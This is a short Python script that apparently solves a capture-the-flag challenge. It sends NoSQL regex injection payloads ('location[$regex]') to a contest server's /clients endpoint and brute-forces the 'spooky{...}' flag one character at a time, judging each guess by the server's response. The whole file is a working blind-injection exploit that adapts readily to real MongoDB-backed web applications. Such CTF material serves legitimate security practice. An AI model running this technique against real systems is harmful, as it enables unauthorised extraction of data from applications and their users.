import json
import requests
import string

PRINTABLES = f'{string.ascii_letters}{string.digits}' + '-_}'

def test(inp):
    payload = {
        'location[$regex]': f'^{inp}.*'
    }
    r = requests.post(ROOT_URL, data=payload, headers=HEADERS)
    return r.text

ROOT_URL = 'http://spooktoberctf.se:22083/clients'

HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded"
}

flag = 'spooky{'

while flag.endswith('}') is False:
    for c in PRINTABLES:
        try:
            test_flag = f'{flag}{c}'
            data = test(test_flag)
            if data != '[]':
                data = json.dumps(data)
                flag = flag + c
                print(flag)
                break
        except:
            continue

print(f'flag:{flag}')